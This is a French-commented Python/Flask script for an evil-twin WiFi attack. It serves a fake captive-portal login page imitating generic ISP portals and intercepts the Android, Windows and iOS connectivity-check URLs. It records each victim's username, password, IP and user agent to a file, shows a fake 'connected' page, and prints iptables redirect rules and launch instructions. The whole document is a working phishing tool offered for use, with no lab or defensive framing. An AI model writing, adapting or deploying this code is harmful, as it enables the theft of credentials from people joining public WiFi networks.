#!/usr/bin/env python3
"""
Captive Portal — Evil Twin Attack
Sert une fausse page de login WiFi, capture les credentials

Dépendances: pip install flask
Lance avec: sudo python3 captive_portal.py

Architecture:
  wlan0  = interface internet (connexion sortante)
  wlan1  = interface AP rogue (les victimes s'y connectent)
  Flask  = captive portal sur port 80/443
  Toutes les requêtes DNS → cette machine → redirigée vers Flask
"""

import os, json, logging
from datetime import datetime
from flask import Flask, request, redirect, render_template_string, make_response

app = Flask(__name__)
logging.basicConfig(level=logging.WARNING)

CREDS_FILE = "captured_creds.txt"
REDIRECT_URL = "https://www.google.com"   # redirection après "login"

# ─── PAGE HTML CAPTIVE PORTAL ─────────────────────────────────────────────────
# Imite une page de connexion WiFi générique (SFR / Orange / Free)
PORTAL_HTML = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connexion WiFi</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: Arial, sans-serif;
    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
    min-height: 100vh;
    display: flex; align-items: center; justify-content: center;
  }
  .card {
    background: #fff;
    border-radius: 12px;
    padding: 40px 36px;
    width: 100%; max-width: 400px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.5);
  }
  .logo {
    text-align: center;
    margin-bottom: 28px;
  }
  .logo svg { width: 60px; height: 60px; }
  h2 { text-align: center; color: #1a1a2e; margin-bottom: 8px; font-size: 22px; }
  .subtitle { text-align: center; color: #666; font-size: 13px; margin-bottom: 28px; }
  label { display: block; font-size: 13px; color: #444; margin-bottom: 6px; font-weight: 600; }
  input[type=text], input[type=password], input[type=email] {
    width: 100%;
    padding: 12px 14px;
    border: 1.5px solid #ddd;
    border-radius: 8px;
    font-size: 14px;
    margin-bottom: 18px;
    outline: none;
    transition: border-color .2s;
  }
  input:focus { border-color: #0f3460; }
  button {
    width: 100%;
    padding: 13px;
    background: #0f3460;
    color: #fff;
    border: none;
    border-radius: 8px;
    font-size: 15px;
    font-weight: 600;
    cursor: pointer;
    transition: background .2s;
  }
  button:hover { background: #16213e; }
  .footer { text-align: center; color: #aaa; font-size: 11px; margin-top: 20px; }
  .ssid-badge {
    background: #f0f4ff;
    border: 1px solid #d0dcff;
    border-radius: 6px;
    padding: 8px 14px;
    text-align: center;
    color: #0f3460;
    font-size: 13px;
    font-weight: 600;
    margin-bottom: 22px;
  }
  .loading { display: none; text-align: center; color: #0f3460; margin-top: 14px; }
</style>
</head>
<body>
<div class="card">
  <!-- Logo WiFi -->
  <div class="logo">
    <svg viewBox="0 0 60 60" fill="none" xmlns="http://www.w3.org/2000/svg">
      <circle cx="30" cy="30" r="30" fill="#0f3460"/>
      <path d="M10 28c5.5-5.5 13-8.8 20-8.8s14.5 3.3 20 8.8" stroke="white" stroke-width="3" stroke-linecap="round" fill="none"/>
      <path d="M16 34c3.8-3.8 8.7-6 14-6s10.2 2.2 14 6" stroke="white" stroke-width="3" stroke-linecap="round" fill="none"/>
      <path d="M22 40c2-2 4.8-3.2 8-3.2s6 1.2 8 3.2" stroke="white" stroke-width="3" stroke-linecap="round" fill="none"/>
      <circle cx="30" cy="46" r="2.5" fill="white"/>
    </svg>
  </div>

  <h2>Connexion au réseau</h2>
  <p class="subtitle">Identifiez-vous pour accéder à Internet</p>

  <div class="ssid-badge">📶 {{ ssid }}</div>

  {% if error %}
  <div style="background:#fff0f0;border:1px solid #ffcccc;border-radius:6px;padding:10px 14px;
              color:#cc0000;font-size:13px;margin-bottom:16px;">
    ⚠️ {{ error }}
  </div>
  {% endif %}

  <form method="POST" action="/login" id="loginForm">
    <label>Adresse e-mail ou identifiant</label>
    <input type="text" name="username" placeholder="exemple@email.com"
           autocomplete="email" required>

    <label>Mot de passe</label>
    <input type="password" name="password" placeholder="••••••••"
           autocomplete="current-password" required>

    <button type="submit" onclick="this.textContent='Connexion en cours...'">
      Se connecter
    </button>
  </form>

  <div class="footer">
    En vous connectant, vous acceptez nos conditions d'utilisation.<br>
    Connexion sécurisée — {{ ssid }} Network Services
  </div>
</div>
</body>
</html>"""

SUCCESS_HTML = """<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connexion réussie</title>
<meta http-equiv="refresh" content="3;url={{ redirect }}">
<style>
  body { font-family: Arial, sans-serif; background: #f5f5f5;
         display: flex; align-items: center; justify-content: center; min-height: 100vh; }
  .card { background: #fff; border-radius: 12px; padding: 40px; text-align: center;
          box-shadow: 0 4px 20px rgba(0,0,0,.1); }
  .check { font-size: 60px; margin-bottom: 16px; }
  h2 { color: #1a1a2e; }
  p { color: #666; margin-top: 10px; font-size: 14px; }
</style>
</head>
<body>
<div class="card">
  <div class="check">✅</div>
  <h2>Connexion établie !</h2>
  <p>Vous êtes maintenant connecté à Internet.<br>Redirection automatique dans 3 secondes...</p>
</div>
</body>
</html>"""

# ─── ROUTES ───────────────────────────────────────────────────────────────────
SSID = os.environ.get("SSID", "WiFi_Public")

@app.route("/", methods=["GET"])
@app.route("/login", methods=["GET"])
@app.route("/generate_204")        # Android captive portal check
@app.route("/gen_204")
@app.route("/connecttest.txt")     # Windows captive portal check
@app.route("/ncsi.txt")
@app.route("/hotspot-detect.html") # iOS captive portal check
@app.route("/library/test/success.html")
def portal():
    """Affiche le portail captif pour toute requête GET."""
    return render_template_string(PORTAL_HTML, ssid=SSID, error=None)

@app.route("/login", methods=["POST"])
def login():
    """Capture les credentials soumis."""
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "").strip()
    ip       = request.remote_addr
    ua       = request.headers.get("User-Agent", "")[:80]
    ts       = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if not username or not password:
        return render_template_string(PORTAL_HTML, ssid=SSID,
                                      error="Veuillez remplir tous les champs.")

    # ── log les creds ──────────────────────────────────────────────────────────
    entry = {
        "ts": ts, "ip": ip,
        "username": username, "password": password,
        "ua": ua, "ssid": SSID
    }
    line = f"[{ts}] IP:{ip} | {username}:{password} | UA:{ua[:40]}"
    print(f"\n  💀 CRED CAPTURED: {line}")

    with open(CREDS_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry) + "\n")

    # ── redirige vers page de succès ───────────────────────────────────────────
    resp = make_response(render_template_string(SUCCESS_HTML, redirect=REDIRECT_URL))
    return resp

@app.errorhandler(404)
def catch_all(e):
    """Intercepte toutes les requêtes HTTP non reconnues → portail."""
    return redirect("/", 302)

if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════════════╗
║           CAPTIVE PORTAL — Evil Twin AP              ║
╠══════════════════════════════════════════════════════╣
║  SSID cible   : {SSID:<38}║
║  Creds file   : {CREDS_FILE:<38}║
║  Redirect     : {REDIRECT_URL:<38}║
╚══════════════════════════════════════════════════════╝

  Assure-toi que les règles iptables sont en place:
    sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 5000
    sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 5000

  SSID custom: SSID="NomDuReseau" python3 captive_portal.py
""")
    app.run(host="0.0.0.0", port=5000, debug=False)
